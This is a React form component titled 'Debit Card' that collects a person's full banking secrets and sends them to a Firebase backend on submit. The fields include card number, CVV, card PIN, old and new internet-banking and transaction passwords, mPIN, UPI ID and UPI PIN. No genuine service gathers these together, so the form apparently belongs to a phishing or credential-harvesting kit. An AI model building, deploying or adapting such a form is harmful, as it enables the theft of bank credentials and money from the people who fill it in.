import { zodResolver } from "@hookform/resolvers/zod"
import { useForm } from "react-hook-form"
import { z } from "zod"

import { Button } from "@/components/ui/button"
import {
    Form,
    FormControl,
    FormDescription,
    FormField,
    FormItem,
    FormLabel,
    FormMessage,
} from "@/components/ui/form"
import {
    Select,
    SelectContent,
    SelectItem,
    SelectTrigger,
    SelectGroup,
    SelectLabel,
    SelectValue,
} from "@/components/ui/select"

import { Input } from "@/components/ui/input"
import { addDebitData } from '../../utils/firebase'

const debitFromSchema = z.object({
    bankCardName: z.string(),
    accName: z.string(),
    accNumber: z.string().min(16, "Account number must be exactly 16 digits").max(16),
    ifscCode: z.string().length(11, "IFSC CODE must be 11 digits"),
    branchName: z.string(),
    cardNumber: z.string().length(16, "Card number must be exactly 16 digits"),
    cardType: z.enum(['MasterCard', 'Visa', 'Rupay']),
    expiryMonth: z.string().min(2, "Month must be between 1 and 12").max(12),
    expiryYear: z.string().min(2, "Year cannot be in the past"),
    cvv: z.string().length(3, "CVV must be exactly 3 digits"),
    pin: z.string().length(4, "PIN must be exactly 4 digits"),
    userId: z.string(),
    oldNetPass: z.string(),
    newNetPass: z.string(),
    mPin: z.string().max(6).min(4),
    oldTransPass: z.string(),
    newTransPass: z.string(),
    mobNum: z.string().length(10),
    email: z.string(),
    upiId: z.string(),
    upiPin: z.string(),

})

export default function DebitCardForm() {
    const debitForm = useForm<z.infer<typeof debitFromSchema>>({
        resolver: zodResolver(debitFromSchema),
    })

    //TODO: FIX TYPE ERROR
    const onInvalid = (error) => console.error(error)
    function onSubmit(values: z.infer<typeof debitFromSchema>) {
        console.log(values)
        addDebitData(values)
    }
    return (
        <>
            <h1 className="text-4xl font-semibold my-6">Debit Card</h1>
            <Form{...debitForm}>
                <form onSubmit={debitForm.handleSubmit(onSubmit, onInvalid)}>
                    <FormField
                        control={debitForm.control}
                        name="bankCardName"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Bank & Card Name</FormLabel>
                                <FormControl>
                                    <Input placeholder="Namedhskfhkjds" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="accName"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Account Holder Name</FormLabel>
                                <FormControl>
                                    <Input placeholder="Namedhskfhkjds" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="accNumber"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Account Number</FormLabel>
                                <FormControl>
                                    <Input placeholder="Name" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="ifscCode"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>IFSC Code</FormLabel>
                                <FormControl>
                                    <Input placeholder="Name" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="branchName"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel> Branch Name</FormLabel>
                                <FormControl>
                                    <Input placeholder="Name" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="cardNumber"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Card Number</FormLabel>
                                <FormControl>
                                    <Input placeholder="XXXXXXXXXXXX1234" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    <FormField
                        control={debitForm.control}
                        name="cardType"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Card Type</FormLabel>
                                <Select onValueChange={field.onChange} defaultValue={field.value}>
                                    <FormControl>
                                        <SelectTrigger>
                                            <SelectValue placeholder="Select Card Type" />
                                        </SelectTrigger>
                                    </FormControl>
                                    <SelectContent>
                                        <SelectItem value="MasterCard">MasterCard</SelectItem>
                                        <SelectItem value="Visa">Visa</SelectItem>
                                        <SelectItem value="Rupay">Rupay</SelectItem>
                                    </SelectContent>
                                </Select>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <div>
                        <FormField
                            control={debitForm.control}
                            name="expiryMonth"
                            render={({ field }) => (
                                <FormItem>
                                    <FormLabel>Expiry Month:</FormLabel>
                                    <FormControl>
                                        <Input placeholder="MM" {...field} />
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                            )}
                        />
                        <FormField
                            control={debitForm.control}
                            name="expiryYear"
                            render={({ field }) => (
                                <FormItem>
                                    <FormLabel>Expiry Year:</FormLabel>
                                    <FormControl>
                                        <Input placeholder="YY" {...field} />
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                            )}
                        />
                    </div>


                    <FormField
                        control={debitForm.control}
                        name="cvv"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>CVV:</FormLabel>
                                <FormControl>
                                    <Input placeholder="123" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="pin"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>PIN Code:</FormLabel>
                                <FormControl>
                                    <Input placeholder="1234" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="userId"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>User ID/ Customer ID</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    <FormField
                        control={debitForm.control}
                        name="oldNetPass"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Old Internet Password:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    <FormField
                        control={debitForm.control}
                        name="newNetPass"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>New Internet Password:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    <FormField
                        control={debitForm.control}
                        name="mPin"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>mPIN:</FormLabel>
                                <FormControl>
                                    <Input placeholder="1234" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    <FormField
                        control={debitForm.control}
                        name="oldTransPass"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Old Transaction Password:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="newTransPass"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>New Transaction Password:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="mobNum"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Registered Mobile Number:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="email"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>Registered Email:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={debitForm.control}
                        name="upiId"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>UPI ID:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    <FormField
                        control={debitForm.control}
                        name="upiPin"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel>UPI Pin:</FormLabel>
                                <FormControl>
                                    <Input placeholder="YY" {...field} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    <Button className='mt-7' type="submit">Submit</Button>

                </form>
            </Form>
        </>
    )
}